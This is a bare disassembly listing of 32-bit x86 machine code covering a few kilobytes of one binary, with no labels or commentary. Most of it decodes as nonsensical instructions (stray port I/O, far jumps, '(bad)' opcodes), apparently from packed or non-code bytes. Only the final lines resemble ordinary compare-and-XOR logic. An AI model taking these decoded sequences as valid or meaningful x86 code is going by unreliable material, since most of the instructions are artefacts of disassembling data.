  4117a1:	scas   al,BYTE PTR es:[edi]
  4117a2:	add    eax,0x8b9aaca4
  4117a7:	dec    edx
  4117a8:	and    DWORD PTR [ebx+0x5d],0x90d02aa9
  4117af:	pop    ecx
  4117b0:	sbb    al,0xdf
  4117b2:	cdq    
  4117b3:	cld    
  4117b4:	pop    eax
  4117b5:	gs dec ebx
  4117b7:	sbb    ch,ch
  4117b9:	out    0x45,eax
  4117bb:	pop    ss
  4117bc:	aaa    
  4117bd:	mov    ebx,0xfba81894
  4117c2:	lahf   
  4117c3:	in     eax,0x20
  4117c5:	dec    eax
  4117c6:	xchg   esi,eax
  4117c7:	shl    BYTE PTR ds:0xe2b1091a,1
  4117cd:	or     eax,0xef151ad7
  4117d2:	into   
  4117d3:	fbld   TBYTE PTR [ebp-0x3c]
  4117d6:	inc    edi
  4117d7:	cld    
  4117d8:	in     eax,dx
  4117d9:	xor    al,BYTE PTR [edi+edi*4+0x134cf483]
  4117e0:	mov    ds:0xc542294b,eax
  4117e5:	popa   
  4117e6:	xchg   BYTE PTR [ecx],cl
  4117e8:	xchg   ebp,eax
  4117e9:	xchg   ebx,eax
  4117ea:	push   cs
  4117eb:	in     eax,0x36
  4117ed:	test   BYTE PTR [eax-0x79],ah
  4117f0:	call   0xaa96:0x334eed24
  4117f7:	pop    esi
  4117f8:	sar    edi,cl
  4117fa:	test   BYTE PTR [esi-0x1a],dh
  4117fd:	shr    BYTE PTR [ebp+0x4c61653f],cl
  411803:	mov    es,WORD PTR [edi]
  411805:	leave  
  411806:	jg     0x4117e3
  411808:	xchg   ecx,eax
  411809:	sbb    al,0x9f
  41180b:	cld    
  41180c:	aaa    
  41180d:	das    
  41180e:	and    al,0xc6
  411810:	sbb    al,0x8
  411812:	les    esp,FWORD PTR [ecx+0x28]
  411815:	xor    eax,0x83c39927
  41181a:	xchg   edx,eax
  41181b:	leave  
  41181c:	in     eax,0xff
  41181e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181f:	push   0xffffffa2
  411821:	arpl   bp,ax
  411823:	pusha  
  411824:	cld    
  411825:	scas   eax,DWORD PTR es:[edi]
  411826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411827:	mov    BYTE PTR [edx+0x30],bh
  41182a:	inc    eax
  41182b:	and    BYTE PTR [eax],al
  41182d:	jmp    0xe6fd:0x19e70a1c
  411834:	add    edi,DWORD PTR [esi]
  411836:	sub    ebx,DWORD PTR [esp+eiz*4+0x52]
  41183a:	and    BYTE PTR [esi+0x6828b18e],cl
  411840:	add    ebp,ebp
  411842:	push   0x801d9349
  411847:	out    dx,ax
  411849:	cwde   
  41184a:	(bad)  
  41184b:	jmp    0x411872
  41184d:	in     al,dx
  41184e:	sahf   
  41184f:	mov    al,ds:0x3e5e8793
  411854:	push   ebx
  411855:	lea    esp,[eax]
  411857:	cmp    ch,dh
  411859:	mov    ds:0x5441686,eax
  41185e:	push   edi
  41185f:	scas   al,BYTE PTR es:[edi]
  411860:	dec    esi
  411861:	xchg   ebx,eax
  411862:	sub    edx,DWORD PTR [ebx]
  411864:	push   ebx
  411865:	push   es
  411866:	test   al,0xc3
  411868:	fcom   DWORD PTR ds:0x396219e
  41186e:	xchg   DWORD PTR [ecx+0x39b2b4b],esp
  411874:	mov    cl,0xd3
  411876:	inc    eax
  411877:	or     DWORD PTR cs:[ecx-0x24],esi
  41187b:	in     eax,0xae
  41187d:	sbb    cl,cl
  41187f:	sbb    bl,BYTE PTR [edi+0x9f87128]
  411885:	mov    al,0xd2
  411887:	sbb    BYTE PTR [ecx],dh
  411889:	add    al,0xec
  41188b:	pop    ebx
  41188c:	dec    edx
  41188d:	in     eax,0xce
  41188f:	push   edx
  411890:	xchg   BYTE PTR [ebx],al
  411892:	cli    
  411893:	pop    ebp
  411894:	adc    DWORD PTR [edi+eiz*8],ebx
  411897:	dec    eax
  411898:	and    eax,0x45cdf514
  41189d:	nop
  41189e:	cs mov ah,0xc5
  4118a1:	and    al,0xf6
  4118a3:	cwde   
  4118a4:	push   esi
  4118a5:	and    dh,al
  4118a7:	int3   
  4118a8:	scas   eax,DWORD PTR es:[edi]
  4118a9:	inc    esp
  4118aa:	sub    cl,dl
  4118ac:	mov    al,0xba
  4118ae:	inc    eax
  4118af:	pop    esp
  4118b0:	mov    dl,BYTE PTR [edi+0x7f]
  4118b3:	adc    ah,BYTE PTR [ebx-0x54]
  4118b6:	fdiv   DWORD PTR [edx+0x6c7e80c]
  4118bc:	mov    ebp,DWORD PTR [esi+ebp*4+0x1d]
  4118c0:	std    
  4118c1:	lds    ebp,FWORD PTR ds:0x9784455f
  4118c7:	fisubr WORD PTR [eax-0x2c]
  4118ca:	fiadd  DWORD PTR [eax+0x23]
  4118cd:	cmp    ah,BYTE PTR [ebp+0x28]
  4118d0:	sbb    dl,al
  4118d2:	inc    ebx
  4118d3:	int3   
  4118d4:	xchg   edi,eax
  4118d5:	daa    
  4118d6:	mov    bh,0xd6
  4118d8:	retf   0xbaf2
  4118db:	rcr    BYTE PTR [eax-0x50],cl
  4118de:	sbb    BYTE PTR [ebx-0x1fa83b78],0xa2
  4118e5:	aas    
  4118e6:	xor    BYTE PTR [edx+0x17],bl
  4118e9:	mov    dh,0x84
  4118eb:	aas    
  4118ec:	mov    ds:0x15f3251d,eax
  4118f1:	sub    al,0x8d
  4118f3:	pop    esi
  4118f4:	je     0x4118f2
  4118f6:	fst    DWORD PTR [ebp+0x50]
  4118f9:	int    0x47
  4118fb:	xor    eax,0x76bce680
  411900:	fcmovu st,st(5)
  411902:	xor    ebx,DWORD PTR [ebx+0x32]
  411905:	jmp    0x7c2b:0xe9e17c6c
  41190c:	outs   dx,BYTE PTR ds:[esi]
  41190d:	ja     0x4118d3
  41190f:	cmp    bh,bh
  411911:	ret    0x11a5
  411914:	loope  0x4118f1
  411916:	sbb    eax,0x5f22948c
  41191b:	push   ebp
  41191c:	inc    esi
  41191d:	retf   
  41191e:	loope  0x41197d
  411920:	mov    bh,0xb7
  411922:	fidiv  WORD PTR [eax]
  411924:	scas   al,BYTE PTR es:[edi]
  411925:	(bad)  
  411926:	mov    esi,DWORD PTR [eax+0x64124cd9]
  41192c:	pusha  
  41192d:	sti    
  41192e:	pusha  
  41192f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411930:	(bad)  
  411931:	cmp    dl,bh
  411933:	mov    al,BYTE PTR [ebp-0x35]
  411936:	jmp    0x9400:0x36b2d0a3
  41193d:	in     al,0xe9
  41193f:	inc    ebp
  411940:	loopne 0x411976
  411942:	mov    al,0x26
  411944:	or     eax,0xa86fbb92
  411949:	mov    cl,0x11
  41194b:	shl    DWORD PTR gs:[ebp-0x41],1
  41194f:	lds    edx,FWORD PTR [edx]
  411951:	pop    ebp
  411952:	mov    cl,0xc3
  411954:	or     eax,0xac266aa6
  411959:	je     0x411906
  41195b:	mov    ebx,0xd2852c81
  411960:	es mov edi,0xc78b6254
  411966:	sbb    al,0x57
  411968:	adc    edx,DWORD PTR [esi+ebp*8-0x4a31bb16]
  41196f:	xor    BYTE PTR [eax+0x14111829],0xc8
  411976:	mov    eax,ds:0x4b9a2eef
  41197b:	psrlw  mm6,QWORD PTR [eax-0x54f9efd4]
  411982:	call   0x5a13bb69
  411987:	sbb    cl,BYTE PTR [esi+0x6c]
  41198a:	jbe    0x41199f
  41198c:	pusha  
  41198d:	mov    ch,0x84
  41198f:	push   es
  411990:	xchg   BYTE PTR [ebx+0x32b27e78],cl
  411996:	sar    BYTE PTR ss:[ebp-0x753bb3f8],1
  41199d:	iret   
  41199e:	jmp    0x20443b2d
  4119a3:	cmc    
  4119a4:	mov    ch,0x30
  4119a6:	in     eax,dx
  4119a7:	jne    0x411932
  4119a9:	(bad)  
  4119aa:	outs   dx,BYTE PTR ds:[esi]
  4119ab:	ja     0x41198d
  4119ad:	pop    eax
  4119ae:	imul   eax,DWORD PTR [esi+esi*1],0xffffffaa
  4119b2:	lock das 
  4119b4:	sub    eax,0x558b51e4
  4119b9:	les    eax,FWORD PTR [ecx+0xf3af1]
  4119bf:	add    BYTE PTR [ebx],cl
  4119c1:	enter  0xa8a1,0x25
  4119c5:	inc    edx
  4119c6:	add    BYTE PTR [ebx+0x1d880],cl
  4119cc:	add    BYTE PTR [ebx+0x65f68100],cl
  4119d2:	data16 add BYTE PTR [eax],al
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x7cb95cb6
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	inc    edi
  411a15:	push   eax
  411a16:	mov    fs,eax
  411a18:	out    0xb0,al
  411a1a:	and    eax,0xe5ff0aef
  411a1f:	pop    edi
  411a20:	push   esp
  411a21:	mov    ecx,0xdd8a0a7c
  411a26:	sub    edx,DWORD PTR [eax-0x451027e4]
  411a2c:	test   BYTE PTR [ebx+0x34],0x1a
  411a30:	adc    bl,cl
  411a32:	jge    0x4119cb
  411a34:	push   cs
  411a35:	xchg   ebp,eax
  411a36:	jl     0x411a18
  411a38:	inc    ebp
  411a39:	sub    al,0x32
  411a3b:	out    dx,eax
  411a3c:	bound  ebp,QWORD PTR [ebx]
  411a3e:	adc    BYTE PTR [edi+0x6f],bl
  411a41:	test   eax,0xe32e85ab
  411a46:	adc    BYTE PTR [edx+esi*4-0x61],al
  411a4a:	fild   DWORD PTR ss:[esi]
  411a4d:	jbe    0x411a17
  411a4f:	int    0x26
  411a51:	add    al,0xbe
  411a53:	inc    esi
  411a54:	xchg   ebp,eax
  411a55:	fprem1 
  411a57:	ds cs xchg esi,eax
  411a5a:	jg     0x411a1a
  411a5c:	cdq    
  411a5d:	(bad)  
  411a5f:	push   eax
  411a60:	pop    ebx
  411a61:	pop    edi
  411a62:	sub    DWORD PTR [bx+si+0x26d0],ebp
  411a67:	nop
  411a68:	xor    cl,bh
  411a6a:	sub    DWORD PTR [edi+0x6a445818],eax
  411a70:	jae    0x411a39
  411a72:	cmp    ebp,DWORD PTR ds:0x2fc38299
  411a78:	jle    0x411a8d
  411a7a:	sub    al,0xdf
  411a7c:	(bad)  
  411a7d:	push   ecx
  411a7e:	fsub   DWORD PTR [eax+eiz*8]
  411a81:	push   0xffffff90
  411a83:	fs and ecx,esi
  411a86:	loopne 0x411a5d
  411a88:	add    al,0xf1
  411a8a:	popw   es
  411a8c:	loopne 0x411a47
  411a8e:	sar    esp,cl
  411a90:	lea    ebx,[ebp-0x16]
  411a93:	mov    ecx,0x206476c4
  411a98:	mov    ebp,0x914b927a
  411a9d:	sahf   
  411a9e:	les    eax,FWORD PTR [edx]
  411aa0:	(bad)  
  411aa2:	jl     0x411aa9
  411aa4:	push   ebp
  411aa5:	adc    al,ch
  411aa7:	pop    ebx
  411aa8:	scas   eax,DWORD PTR es:[edi]
  411aa9:	out    0x28,eax
  411aab:	and    bh,bh
  411aad:	add    edx,DWORD PTR [esi]
  411aaf:	and    al,0x4e
  411ab1:	jne    0x411ad3
  411ab3:	call   0xefb7:0xd5242753
  411aba:	nop
  411abb:	mov    dl,0x1a
  411abd:	push   ebx
  411abe:	mov    bl,0xde
  411ac0:	pusha  
  411ac1:	jp     0x411b24
  411ac3:	sbb    BYTE PTR [edi+0x7d],cl
  411ac6:	sub    DWORD PTR [edi+0x6b],edi
  411ac9:	mov    bl,0x5
  411acb:	inc    ecx
  411acc:	sub    ah,dh
  411ace:	push   ecx
  411acf:	(bad)  
  411ad0:	mov    bh,0xc7
  411ad2:	mov    eax,0x1202029b
  411ad7:	sbb    BYTE PTR [ebp+0x44],cl
  411ada:	sbb    cl,dh
  411adc:	sub    eax,0x63b71b97
  411ae1:	loope  0x411ae2
  411ae3:	sub    BYTE PTR [esi+0x7],bl
  411ae6:	push   esp
  411ae7:	and    bh,BYTE PTR [esi]
  411ae9:	adc    BYTE PTR [ebx+0x7e4e3a40],ah
  411aef:	addr16 nop
  411af1:	sbb    BYTE PTR [esi+0x12],ah
  411af4:	cmp    BYTE PTR [edi-0x6f],bh
  411af7:	push   0xffffffc0
  411af9:	xor    BYTE PTR [ebx],dl
  411afb:	adc    bl,BYTE PTR [edi]
  411afd:	ret    0x6619
  411b00:	jae    0x411adc
  411b02:	retf   0xc611
  411b05:	sub    bh,dl
  411b07:	daa    
  411b08:	xchg   ecx,eax
  411b09:	data16 sub al,0xa7
  411b0c:	test   eax,0xec88d7eb
  411b11:	adc    DWORD PTR [ebp-0x67],0x6a
  411b15:	cmc    
  411b16:	ja     0x411b31
  411b18:	lods   al,BYTE PTR ds:[esi]
  411b19:	jmp    0x70b4d453
  411b1e:	or     BYTE PTR [ebx],dl
  411b20:	loop   0x411b88
  411b22:	out    dx,eax
  411b23:	dec    ebx
  411b24:	test   DWORD PTR [edi],eax
  411b26:	out    dx,eax
  411b27:	xchg   esi,eax
  411b28:	leave  
  411b29:	sbb    eax,0xf4cfb477
  411b2e:	clc    
  411b2f:	push   edx
  411b30:	or     BYTE PTR [ebx-0x23722bf5],ah
  411b36:	(bad)  
  411b38:	sar    BYTE PTR [edx+0x3a8b0c],0xb4
  411b3f:	push   ds
  411b40:	shl    BYTE PTR [edx-0x77],cl
  411b43:	or     ch,bh
  411b45:	cmp    eax,0xdb3d985d
  411b4a:	pusha  
  411b4b:	call   0xc226:0xb0f6fa55
  411b52:	fiadd  WORD PTR [ecx+0x78]
  411b55:	lds    eax,FWORD PTR [esi+ebp*8-0x60a4c6d7]
  411b5c:	fnstsw WORD PTR [edi+edi*4-0x32]
  411b60:	call   0x3743:0x8d65837c
  411b67:	in     eax,dx
  411b68:	mov    esi,0x24208e9e
  411b6d:	lock (bad) 
  411b6f:	pushf  
  411b70:	xchg   DWORD PTR [ebx+0x2e],esi
  411b73:	(bad)  
  411b74:	xor    edi,DWORD PTR [ebx+edx*8-0x292894ad]
  411b7b:	fwait
  411b7c:	xchg   ecx,eax
  411b7d:	es hlt 
  411b7f:	cmp    al,0x7c
  411b81:	xor    ebx,edi
  411b83:	mov    ah,0x90
  411b85:	call   0x875bde8a
  411b8a:	ss xchg esi,eax
  411b8c:	test   DWORD PTR [esi+edi*8-0x5139fbb4],ecx
  411b93:	sub    al,0xf5
  411b95:	xor    eax,0x1f0861d6
  411b9a:	dec    edi
  411b9b:	xlat   BYTE PTR ds:[ebx]
  411b9c:	adc    dh,al
  411b9e:	popa   
  411b9f:	jmp    0x411b68
  411ba1:	or     BYTE PTR [ebx],0x4
  411ba4:	fs adc eax,0x3e11e6c6
  411baa:	fild   WORD PTR [edx]
  411bac:	inc    ebx
  411bad:	sub    edx,DWORD PTR [edx]
  411baf:	js     0x411c1c
  411bb1:	cdq    
  411bb2:	xor    al,0xde
  411bb4:	push   ss
  411bb5:	xchg   ecx,eax
  411bb6:	sub    BYTE PTR [ebp-0x5a],cl
  411bb9:	cwde   
  411bba:	jne    0x411ba4
  411bbc:	dec    ecx
  411bbd:	and    DWORD PTR [ebx+ecx*1-0x5d],eax
  411bc1:	(bad)  
  411bc2:	inc    eax
  411bc3:	and    al,0x3d
  411bc5:	daa    
  411bc6:	popf   
  411bc7:	addr16 mov ebp,0x180c1eb2
  411bcd:	enter  0xa191,0xa6
  411bd1:	xchg   ebp,eax
  411bd2:	call   0xaeea:0xf55ed279
  411bd9:	xor    al,0xd8
  411bdb:	dec    ecx
  411bdc:	add    ch,BYTE PTR [esi]
  411bde:	and    DWORD PTR [edx+0x159bea67],edi
  411be4:	adc    BYTE PTR [esi],bl
  411be6:	dec    esp
  411be7:	ret    0x5ff9
  411bea:	xchg   BYTE PTR [edi],ch
  411bec:	dec    edx
  411bed:	(bad)  
  411bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bef:	dec    ebp
  411bf0:	jle    0x411bdc
  411bf2:	or     eax,0xa93d7459
  411bf7:	mov    edx,eax
  411bf9:	imul   eax,DWORD PTR [ebp+0x3b],0x71
  411bfd:	imul   edx,edx,0x10
  411c00:	fistp  QWORD PTR [bp+di-0x2fce]
  411c05:	dec    edi
  411c06:	xchg   ebp,eax
  411c07:	pusha  
  411c08:	inc    ebx
  411c09:	test   BYTE PTR fs:[edi],dh
  411c0c:	push   0x7a
  411c0e:	pop    esp
  411c0f:	cmp    dh,BYTE PTR [eax-0x7a481e35]
  411c15:	jns    0x411bf0
  411c17:	add    eax,0xb50d9595
  411c1c:	or     ch,0xd1
  411c1f:	or     DWORD PTR [eax+0x13],eax
  411c22:	adc    eax,0x2a0e5e0
  411c27:	add    ch,BYTE PTR [ebx]
  411c29:	rcr    DWORD PTR ss:[edx+0x4d],1
  411c2d:	push   ebp
  411c2e:	xlat   BYTE PTR ds:[ebx]
  411c2f:	dec    esp
  411c30:	add    BYTE PTR [edx],ch
  411c32:	out    dx,eax
  411c33:	test   al,0x21
  411c35:	inc    esi
  411c36:	xor    BYTE PTR [edx+eax*2],dl
  411c39:	cdq    
  411c3a:	outs   dx,BYTE PTR ds:[esi]
  411c3b:	pop    ecx
  411c3c:	(bad)  
  411c3d:	jno    0x411c6c
  411c3f:	popf   
  411c40:	pop    ebp
  411c41:	lods   eax,DWORD PTR ds:[esi]
  411c42:	cmp    edi,esp
  411c44:	fstp   QWORD PTR [esi-0x4d]
  411c47:	jle    0x411c7a
  411c49:	fimul  WORD PTR [edi]
  411c4b:	out    0x67,eax
  411c4d:	out    dx,al
  411c4e:	cli    
  411c4f:	add    dl,BYTE PTR [ebp+ebp*8+0x76]
  411c53:	xchg   ecx,eax
  411c54:	dec    ebx
  411c55:	sbb    eax,0x6ad40c46
  411c5a:	addr16 push edi
  411c5c:	dec    ebx
  411c5d:	dec    ebp
  411c5e:	mov    eax,ds:0xcdd52ebd
  411c63:	cld    
  411c64:	imul   edx
  411c66:	mov    WORD PTR fs:[ebx+ebp*1+0x4d8b0a62],cs
  411c6e:	mov    ah,0x8b
  411c70:	push   ebp
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x2f2f6a08]
  411c98:	lock mov esi,0x18186a4f
  411c9e:	jno    0x411cb4
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	sub    DWORD PTR [ebx+0x2ebff86b],eax
  411ca8:	fcomp  DWORD PTR [esi-0x2a]
  411cab:	scas   al,BYTE PTR es:[edi]
  411cac:	mov    al,0xa2
  411cae:	inc    eax
  411caf:	pop    esi
  411cb0:	mov    dh,0x50
  411cb2:	mov    cl,0x72
  411cb4:	mov    cl,0xa7
  411cb6:	push   edx
  411cb7:	push   ss
  411cb8:	daa    
  411cb9:	cdq    
  411cba:	(bad)  
  411cbb:	outs   dx,DWORD PTR ds:[esi]
  411cbc:	xchg   BYTE PTR [ecx+0x77f5b58d],cl
  411cc2:	ror    BYTE PTR [eax+ecx*1-0x61d6ac99],1
  411cc9:	push   ss
  411cca:	sbb    DWORD PTR [esi*1-0x486371a7],esi
  411cd1:	adc    DWORD PTR [edi-0x75],esi
  411cd4:	repz jecxz 0x411cc5
  411cd7:	add    edi,esi
  411cd9:	push   esp
  411cda:	push   eax
  411cdb:	sub    DWORD PTR [edi+0x4bad6759],0x81373901
  411ce5:	push   ds
  411ce6:	les    esi,FWORD PTR [ebp+eax*1-0x2cb742bb]
  411ced:	ret    
  411cee:	add    eax,0x65e227d9
  411cf3:	(bad)  
  411cf4:	mov    ds:0xdfae24f1,eax
  411cf9:	xor    eax,0x461994f1
  411cfe:	and    al,0xaa
  411d00:	icebp  
  411d01:	stos   BYTE PTR es:[edi],al
  411d02:	lock jg 0x411cfd
  411d05:	(bad)  
  411d06:	stos   DWORD PTR es:[edi],eax
  411d07:	std    
  411d08:	stos   DWORD PTR es:[edi],eax
  411d09:	jmp    0x411d59
  411d0b:	fnstenv [edi+0x15]
  411d0e:	ret    
  411d0f:	mov    cl,0x9a
  411d11:	mov    ebx,0x9ed2108e
  411d16:	dec    ebx
  411d17:	sbb    BYTE PTR [eax],dl
  411d19:	scas   eax,DWORD PTR es:[edi]
  411d1a:	pushf  
  411d1b:	inc    edi
  411d1c:	sub    al,0x64
  411d1e:	push   esp
  411d1f:	sub    al,cl
  411d21:	sbb    eax,0x2b063960
  411d26:	push   esi
  411d27:	add    edi,DWORD PTR ds:0xcc2bfd64
  411d2d:	or     eax,0x3057be70
  411d32:	sbb    dh,0x24
  411d35:	push   0x291f8e26
  411d3a:	je     0x411d4c
  411d3c:	add    DWORD PTR [edi+esi*8-0x7a2fe38f],esp
  411d43:	push   ecx
  411d44:	int3   
  411d45:	stc    
  411d46:	adc    BYTE PTR [eax+0x4a],0xd
  411d4a:	imul   esp,DWORD PTR [edi+0x4f4fd09],0x4
  411d51:	sbb    ecx,DWORD PTR [eax-0x6b]
  411d54:	sti    
  411d55:	loop   0x411d66
  411d57:	fistp  DWORD PTR [ecx-0x4b10dad]
  411d5d:	sahf   
  411d5e:	daa    
  411d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d60:	or     BYTE PTR [edx],dh
  411d62:	mov    BYTE PTR [edx],bl
  411d64:	mov    ebx,0x9972568e
  411d69:	dec    esi
  411d6a:	lock rol DWORD PTR [ecx+0x54],1
  411d6e:	push   eax
  411d6f:	fadd   DWORD PTR [eax-0x2362a364]
  411d75:	xor    ah,BYTE PTR [ebx-0x3c]
  411d78:	inc    eax
  411d79:	ret    
  411d7a:	jnp    0x411db4
  411d7c:	dec    ebx
  411d7d:	mov    ch,0xec
  411d7f:	cmp    BYTE PTR [eax+0x76],ch
  411d82:	jge    0x411dd3
  411d84:	adc    BYTE PTR [ecx],ah
  411d86:	adc    BYTE PTR [edx],al
  411d88:	mov    ds:0xd6ac53dc,eax
  411d8d:	pop    esi
  411d8e:	inc    ecx
  411d8f:	mov    edx,0x3ee5c598
  411d94:	xor    DWORD PTR [ecx+0x4a3f676c],esp
  411d9a:	jo     0x411de6
  411d9c:	xor    BYTE PTR [esi+0x78],bl
  411d9f:	std    
  411da0:	dec    ebp
  411da1:	add    eax,0x30af5c9e
  411da6:	and    dl,BYTE PTR [eax-0x5]
  411da9:	into   
  411daa:	mov    dh,0x6c
  411dac:	popa   
  411dad:	mov    edx,0x5d564939
  411db2:	out    dx,al
  411db3:	sbb    al,0x8a
  411db5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  411db7:	icebp  
  411db8:	cs mov ch,dh
  411dbb:	dec    ebx
  411dbc:	cwde   
  411dbd:	xchg   esp,ebp
  411dbf:	mov    esp,0x6e91aae5
  411dc4:	repz sbb BYTE PTR [ecx-0x713d9e6e],bl
  411dcb:	ds pop esi
  411dcd:	dec    esp
  411dce:	dec    eax
  411dcf:	es xchg esi,eax
  411dd1:	shr    DWORD PTR [ebx],cl
  411dd3:	loope  0x411dac
  411dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd6:	push   ebx
  411dd7:	inc    ecx
  411dd8:	retf   
  411dd9:	mov    ds:0x9c7c8412,eax
  411dde:	xor    eax,0xffbf84b0
  411de3:	stos   DWORD PTR es:[edi],eax
  411de4:	push   esi
  411de5:	pop    ebx
  411de6:	icebp  
  411de7:	cdq    
  411de8:	mov    ecx,0xcc664c7e
  411ded:	adc    dl,BYTE PTR [ebx]
  411def:	js     0x411df7
  411df1:	pop    esp
  411df2:	gs std 
  411df4:	push   ss
  411df5:	pop    ebp
  411df6:	cli    
  411df7:	lahf   
  411df8:	jecxz  0x411d9f
  411dfa:	mov    BYTE PTR [esi],ah
  411dfc:	xchg   BYTE PTR [eax+esi*8-0xc6c68cd],bl
  411e03:	(bad)  
  411e04:	imul   DWORD PTR es:[ecx+esi*1-0x38]
  411e09:	sar    dl,1
  411e0b:	mov    esp,0xa41f8bf4
  411e10:	pop    ebp
  411e11:	xchg   esi,eax
  411e12:	ins    BYTE PTR es:[edi],dx
  411e13:	retf   0xae6
  411e16:	and    edi,DWORD PTR [edi]
  411e18:	aad    0x72
  411e1a:	loope  0x411de3
  411e1c:	adc    cl,BYTE PTR [edx]
  411e1e:	je     0x411da9
  411e20:	fstp   TBYTE PTR ds:0x2e2ccab3
  411e26:	pop    edx
  411e27:	inc    edi
  411e28:	adc    eax,DWORD PTR [edi]
  411e2a:	sbb    ah,dl
  411e2c:	iret   
  411e2d:	pop    ebp
  411e2e:	xchg   DWORD PTR [ecx-0x1e658d78],ebx
  411e34:	ror    BYTE PTR [ebp+0xf],0x44
  411e38:	enter  0x3cb7,0x68
  411e3c:	mov    BYTE PTR [esi-0xa],bh
  411e3f:	sbb    ebx,esi
  411e41:	jae    0x411e9c
  411e43:	std    
  411e44:	pop    ebp
  411e45:	hlt    
  411e46:	xlat   BYTE PTR ds:[ebx]
  411e47:	pop    edi
  411e48:	(bad)  
  411e4a:	loope  0x411e9e
  411e4c:	pop    ds
  411e4d:	push   cs
  411e4e:	cmp    al,0x98
  411e50:	ror    dh,cl
  411e52:	xor    esp,DWORD PTR ds:0xa584cf33
  411e58:	pop    ebx
  411e59:	xor    eax,0x7372b074
  411e5e:	push   esp
  411e5f:	jns    0x411e80
  411e61:	leave  
  411e62:	sbb    DWORD PTR [esi],esi
  411e64:	mov    ds:0x31512d7e,al
  411e69:	or     BYTE PTR [esi-0x2c533965],al
  411e6f:	mov    BYTE PTR [ebx-0x6a36bf0a],ch
  411e75:	xor    BYTE PTR [edx+0x43],cl
  411e78:	fucompp 
  411e7a:	ins    BYTE PTR es:[edi],dx
  411e7b:	loopne 0x411e68
  411e7d:	sahf   
  411e7e:	mov    ch,0x4e
  411e80:	cmp    BYTE PTR [ebx+eax*2+0x17076821],0xb3
  411e88:	dec    BYTE PTR [edi-0x39b706d3]
  411e8e:	push   0xffffffb7
  411e90:	add    eax,DWORD PTR [esi]
  411e92:	cwde   
  411e93:	push   0x7e
  411e95:	xor    DWORD PTR [ecx],edi
  411e97:	es jle 0x411e6c
  411e9a:	fimul  WORD PTR [ebx+0xf]
  411e9d:	ins    DWORD PTR es:[edi],dx
  411e9e:	adc    al,0xd6
  411ea0:	ins    DWORD PTR es:[edi],dx
  411ea1:	in     ax,dx
  411ea3:	ja     0x411e2a
  411ea5:	mov    dh,0x71
  411ea7:	mov    WORD PTR [edi],?
  411ea9:	cmp    al,0xce
  411eab:	sbb    al,0xdd
  411ead:	adc    al,0xf3
  411eaf:	psubusb mm5,QWORD PTR [ebx+0x447dc87f]
  411eb6:	lods   eax,DWORD PTR ds:[esi]
  411eb7:	xchg   edx,eax
  411eb8:	or     eax,0x40231fe8
  411ebd:	out    dx,al
  411ebe:	mov    edx,0x2c430058
  411ec3:	push   ss
  411ec4:	ret    
  411ec5:	cmp    eax,0x1f38c2e2
  411eca:	mov    bh,0xf5
  411ecc:	sub    DWORD PTR [edi-0x49],esi
  411ecf:	adc    al,0x68
  411ed1:	cmp    al,0xdf
  411ed3:	xchg   BYTE PTR [ebx+ecx*1],al
  411ed6:	aaa    
  411ed7:	sti    
  411ed8:	popf   
  411ed9:	cmp    cl,al
  411edb:	scas   eax,DWORD PTR es:[edi]
  411edc:	cmp    al,0x5d
  411ede:	mov    dh,0x18
  411ee0:	repz in eax,dx
  411ee2:	inc    eax
  411ee3:	push   0xffffffe8
  411ee5:	loopne 0x411f08
  411ee7:	leave  
  411ee8:	std    
  411ee9:	fwait
  411eea:	dec    ebx
  411eeb:	xor    eax,0x7c71cb14
  411ef0:	xchg   ecx,eax
  411ef1:	scas   al,BYTE PTR es:[edi]
  411ef2:	inc    edi
  411ef3:	mov    bl,0x49
  411ef5:	add    eax,0x5f575200
  411efa:	or     ecx,esi
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x4225a8
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x422644
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x42263c,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
